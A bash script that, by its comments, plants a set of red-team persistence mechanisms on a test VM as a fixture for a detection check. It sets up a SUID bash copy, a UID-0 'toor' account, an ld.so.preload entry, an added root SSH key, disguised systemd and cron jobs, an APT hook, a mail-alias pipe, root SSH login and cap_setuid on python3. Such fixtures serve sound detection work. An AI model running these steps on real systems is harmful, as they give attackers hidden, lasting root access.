#!/bin/bash
# Plant a representative set of red-team persistence on a test VM.
# Every item here has a matching line in expected.txt.
set -euo pipefail

echo '* * * * * root /var/tmp/.b -p -c "id" >/dev/null' > /etc/cron.d/updater
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash toor
touch /usr/lib/libz.so.1.bak
echo /usr/lib/libz.so.1.bak > /etc/ld.so.preload
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyForTestingOnly0000000000000000000 red@team' >> /root/.ssh/authorized_keys
cp /bin/bash /var/tmp/.b
chmod u+s /var/tmp/.b
cat > /etc/systemd/system/snapd-refresh-helper.service <<'UNIT'
[Service]
ExecStart=/var/tmp/.b -p -c "id"
UNIT
cat > /etc/systemd/system/snapd-refresh-helper.timer <<'UNIT'
[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
[Install]
WantedBy=timers.target
UNIT
echo 'APT::Update::Pre-Invoke {"/var/tmp/.b -p";};' > /etc/apt/apt.conf.d/99update
echo 'support: "|/var/tmp/.b"' >> /etc/aliases
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
setcap cap_setuid+ep "$(readlink -f /usr/bin/python3)"
echo planted
